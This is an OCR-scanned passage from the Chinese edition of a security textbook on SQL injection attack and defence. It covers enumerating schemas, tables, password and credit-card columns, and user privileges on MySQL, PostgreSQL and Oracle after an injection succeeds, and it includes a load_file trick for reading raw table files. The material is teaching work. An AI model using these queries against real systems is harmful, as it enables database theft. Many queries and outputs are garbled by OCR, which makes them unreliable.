SQL注入攻击与防御（第2版）
要想列出安装在远程MySQL上的数据库，可使用下列查询（假设拥有管理员权限）：
SELECT distinct (db) EROK mysql . db;
如果没有管理员权限，但远程MySQL为5.0或更高的版本，那么仍然可以使用information
_schema并通过注入下列内容来获取相同的信息：
SELECT schema_name FROM information_schema.schemata;
查询information_schema可以枚举整个数据库结构。检索到数据库后，您会发现有一个库
(比如customers_db）看起来很有趣。可以使用下列查询提取表名：
SELECT table_schema, table_name FROM information_schema.tables WHERE
table_schema = 'customers_db 
如果想获取所有数据库的所有表，那么只需省略WHERE子句即可。您可能想作如下修改：
SELECT table_schema, table_name FROM information_schema.tables WHERE
table_schema != *mysql' AND table_schena != 'information_schema*
该查询将检索除了属于mysql和information_schema 这两个内置数据库之外的所有表，因
为这两个数据库的表中不存在我们想要的信息。找到需要的表之后，接下来检索列，还是要避
免检索所有属于mysql和 information_schema 的项：
SELECT table_schema, table_name, column_name FROM information_
schema.columns WHERE table_schema 1= 'mysq1* AND table_8chema !=
' information_schema*
该查询提供一个有关所有数据库、表和列的完整视图，它们包含在一个细致的表中，如下
所示：
mysql> SELECT table_schema, table_name, column_name FROM
information_schema,columns WHERE table_schema 1= 'mysql' AND
table_schema I- *information_schema′;
1 table_schema I table_name 1 column_name
= 
dous 1
I customers
PTI
1 shop
 customers
Iname
doqs1
1 shop
I customers
Isurname
I customers
11ogin
1  shop
I customers
I passvord
dous 1
I customere
1 address
dous 1
Icustomers
Iphone
dous 1
I customers
Iemai1
不难发现，如果Web应用允许执行UNIONSELECT操作，那么该查询将直接提供整个数
据库服务器的完整描述！此外，如果您更喜欢用另一种方法来寻找包含自己感兴趣内容的列的
表，可以使用下列查询：
SELECT table_schema, table_name, column_name FROM information_schema.
144
---
## Page 159
第4章利用SQL注入
'credit_card';
and you might obtain something such as this:
I table_schema
1 table_name
I column_name
1  shop
Iusers
1 passvord
1mysq1
Iuser
1passvord
1financial
I customers
 credit_card
2 rows in set (0.03 sec)
informmation_schema不只包含数据库的结构，还包含与数据库用户权限及其得到的授权相
关的信息。例如，要想列举授予各种用户的权限，可执行下列查询：
SELECT grantee, privilege_type, is_grantable FRox information_sch
user_privileges;
该查询返回类似于下面的内容：
1guarantee
1 privilege_type
is_grantable
'root'@'localhost*
1SELECT
1 YES
'root*@'localhost*
1INSERT
IYES
'root*@'localhost*
1UPDATE
IYES
'root'@'1ocalhost'
1DELETE
IYES
'root*@'localhost*
1 CREATE
IYES
'root'@'localhost'
1DROP
IYES
1
'root*@'localhost'
IRELOAD
IYES
'root*8'localhost*
NMOGANHS 1
IYES
'root*@'localhost'
PROCESS
IYES
'root*@'localhost'
3T181
IYES
1
'root*@'localhost'
1REFERENCES
IYES
I*root*e'localhost*
I INDEX
I YES
如果您需要知道不同数据库授予用户的权限，可以使用下列查询：
SELECT grantee, table_schema, privilege_type FRoM information_schema.
schena_privileges
由于篇幅限制，我们无法包含所有有助于枚举特定技术的信息的查询，不过第10章会提
供一些备忘单。还可以在线获取备忘单，它们可帮助您迅速定位用于执行特定数据库上特定任
务时的查询。可访间http://pentestmonkey.net/cheat-sheets/以获取备忘单。
遗的是，information_schema只适用于MySQL5及之后的版本。如果面对的是早期版本，
该过程将更加困难，只能通过暴力攻击来确定表名和列名。我们可以这样做（不过有点复杂）：
先访问存储目标数据库的文件，将其原始内容导入到我们创建的一张表中，然后使用前面介绍
的技术提取该表。下面通过一个例子米简单地介绍该技术。使用下列查询可以很容易找到当前
数据库名：
145
---
## Page 160
SQL注入攻击与防御（第2版）
SELECT database ()
数据库的文件保存在与数据库名称相同的目录下。此目录包含在主MySQL数据目录中，
可使用下列查询来返回该目录：
SELECT Bedatadir
数据库的所有表包含在一个扩展名为MYD的文件中。例如，下面是mysq/数据库默认的
一些MYD文件：
tables_priv.MYD
host .MYD
help_keyword.MYD
columns_priv,MYD
xW*qp
可使用下列查询提取该数据库中特定表的内容：
SELECT load_file ( *databasename/ tablename .MYD ′)
要是没有information_schema，就必须先暴力破解表名后才能成功执行该查询。另外还要注
意：load_file（第6章会详细讨论）允许检索的字节数有个最大值，该值由@@max_allowed_packet
变量指定。所以该技术不适用于存储了大量数据的表。
4.6.3 PostgreSQL
显然，常用的层次化方法也适用于PostgreSQL。可以使用下面的语句列出所有数据库；
SELECT datname FROK pg_database
如果想知道哪个数据库是当前数据库，只须使用下面这个非常简单的查询：
SELECT current_database ()
下面的查询将返回数据库用户的完整列表：
SELECT usename FROK pPg_user
可以使用下列查询之一来获取当前用户：
SELECT current_user;
SELECT session_user;
f () eweuzesnfdye5 IoaT3s
这4种方法都用于获取当前用户吗？不是的，它们有着细微的差别：session_user返回启
动当前数据库连接的用户，面current_user和user（二者是等价的）则返回当前执行上下文的用户，
即返回用于检查许可权限的那个用户账号。除非在某处调用了SETROLE指令，否则二者通常
返回相同的值。对于最后一条语句，getpgusermameO将返回与当前线程关联的用户。通常，它
返回的用户与前面查询语句返回的结果相同。
对于所连接的数据库，要枚举其中所有模式（schema）中的全部表，可以使用下列查询语句
之一：
146
---
## Page 161
第4章利用SQL注入
SELECT c.relname FROM pg_catalog·pg_class c LEFT JOIN pg_catalog.
P9_namespace n ON n.oid = c.relnamespace WHERE c,relkind IN ('r*, **)
AND n.nspname NOT IN (*pg_catalog', *pg_toast′) AND pg_catalog
pg_table_is_visible (c.oid)
SELECT tablename FROM pg_tables WHERE tablename NOT LIKE 'pg_s' AND
tablename NOT LIKE *sq1_$*
如果想提取所有列的一个列表，可以使用下面的查询：
SELECT relname, A.attname FROM pg_class C, P9_namespace N,
P9_attribute A, P9_type T WHERE (C.relkind=*x′) AND (N.oid=
C.relnamespace) AND (A.attrelid=C,oid) AND (A.atttypid=T,oid) AND
(A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE *public*)
上面的查询语句将提取public模式中所有的列。如果需要提取其他模式中的所有列，只须
修改最后一个ILIKE子句即可。
对于我们感兴趣的列(常见的例子有password和passwd列)，如果想找到包含这些列的表，
可以使用下面的查询，请根据需要修改最后一个LIKE子句：
SELECT DISTINCT relname FROM pg_class C, Pg_namespace N, P9_attribute
A, P9_type T WHERE (C.relkind=*r*) AND (N.oid=C.relnamespace) AND
(A.attrelid=C.oid) AND (A.atttypid=T,oid) AND (A.attnum>O) AND (NOT
3XIT eweuaae CN (,oTIqnd, 3XITI aueudsu*N) CNV (paddoxpsTare*y
$password% *
由于本书篇幅的原因，这里无法列举出对于某种特定技术枚举数据库信息的所有有用的查
询，但在本书第11章中提供了一个备忘录。也可以在线访间该备忘录。它可以帮助你快速地
定位出在某种特定数据库中处理特定任务的合适查询，可以从http://pentestmonkey.net/cheat-
sheets/找到这些备忘录。
4.6.4Oracle
最后要介绍的一个例子是：当后台数据库服务器为Oracle时，如何枚举数据库模式。使用
Oracle时要记住一个重要事实：通常一次只能访问一个数据库（我们一般通过特定的连接来访间
Oracle中的数据库)，当应用程序访问多个数据库时通常使用不同的连接。因此，与SQLServer
和MySQL不同，寻找数据库模式时将无法枚举存在的数据库。
我们首先感兴趣的内容是所有属于当前用户的表。在某一应用程序环境下，它们通常是数
据库中的应用程序所用到的表：
select table_name from user_tables;
可以扩展该语句以查者数据库中的所有表以及表的所有者：
select owner, table_name from all_tables;
可以枚举更多关于应用表的信息以确定表中出现的列数和行数，如下所示：
select a.table_namel1*[*Ilcount (*) II*)=*IInum_rows from user_tab
columns a,user_tables b where a.table_name=b.table_name group by
a . table_name, num_rows
EMP [8] =1 4
147
---
## Page 162